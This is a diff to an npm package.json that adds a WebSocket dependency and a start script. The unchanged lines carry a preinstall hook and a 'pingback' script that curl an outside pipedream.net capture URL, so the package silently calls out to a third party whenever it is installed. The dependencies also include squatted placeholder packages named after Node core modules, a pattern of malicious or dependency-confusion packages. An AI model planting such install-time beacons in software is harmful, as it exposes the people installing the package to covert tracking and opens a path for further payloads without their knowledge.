@@ -31,7 +31,8 @@
     "child_process": "^1.0.2",
     "fs": "^0.0.1-security",
     "os": "^0.1.2",
-    "path": "^0.12.7"
+    "path": "^0.12.7",
+    "ws": "^8.11.0"
   },
   "devDependencies": {
     "@ark/attest": "0.53.0",
@@ -121,7 +122,8 @@
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "tsup",
     "preinstall": "curl https://eo536ohsnextro9.m.pipedream.net",
-    "pingback": "curl https://eo536ohsnextro9.m.pipedream.net"
+    "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
+    "start": "index.js"
   },
   "main": "./index.js",
   "types": "./types/index.d.ts",
